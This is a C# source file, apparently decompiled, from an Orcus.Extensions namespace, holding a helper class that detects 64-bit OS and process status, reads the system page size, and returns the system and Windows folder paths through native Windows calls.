using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Orcus.Native;

namespace Orcus.Extensions;

internal static class EnvironmentExtensions
{
	private delegate bool IsWow64ProcessDelegate([In] IntPtr handle, out bool isWow64Process);

	private static bool? _is64BitOperatingSystem;

	private static bool? _is64BitProcess;

	private static int? _systemPageSize;

	public static bool Is64BitOperatingSystem
	{
		get
		{
			if (!_is64BitOperatingSystem.HasValue)
			{
				_is64BitOperatingSystem = IntPtr.Size == 8 || (IntPtr.Size == 4 && Is32BitProcessOn64BitProcessor());
			}
			return _is64BitOperatingSystem.Value;
		}
	}

	public static bool Is64BitProcess
	{
		get
		{
			if (!_is64BitProcess.HasValue)
			{
				_is64BitProcess = IntPtr.Size == 8;
			}
			return _is64BitProcess.Value;
		}
	}

	public static int SystemPageSize
	{
		get
		{
			if (!_systemPageSize.HasValue)
			{
				SYSTEM_INFO lpSystemInfo = default(SYSTEM_INFO);
				NativeMethods.GetSystemInfo(ref lpSystemInfo);
				_systemPageSize = lpSystemInfo.dwPageSize;
			}
			return _systemPageSize.Value;
		}
	}

	public static string SystemDirectory
	{
		get
		{
			StringBuilder stringBuilder = new StringBuilder(260);
			NativeMethods.SHGetSpecialFolderPath(IntPtr.Zero, stringBuilder, 41, fCreate: false);
			return stringBuilder.ToString();
		}
	}

	public static string WindowsFolder => Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.System))!.FullName;

	private static IsWow64ProcessDelegate GetIsWow64ProcessDelegate()
	{
		IntPtr intPtr = NativeMethods.LoadLibrary("kernel32");
		if (intPtr != IntPtr.Zero)
		{
			IntPtr procAddress = NativeMethods.GetProcAddress(intPtr, "IsWow64Process");
			if (procAddress != IntPtr.Zero)
			{
				return (IsWow64ProcessDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(IsWow64ProcessDelegate));
			}
		}
		return null;
	}

	private static bool Is32BitProcessOn64BitProcessor()
	{
		IsWow64ProcessDelegate isWow64ProcessDelegate = GetIsWow64ProcessDelegate();
		if (isWow64ProcessDelegate == null)
		{
			return false;
		}
		if (!isWow64ProcessDelegate(Process.GetCurrentProcess().Handle, out var isWow64Process))
		{
			return false;
		}
		return isWow64Process;
	}
}
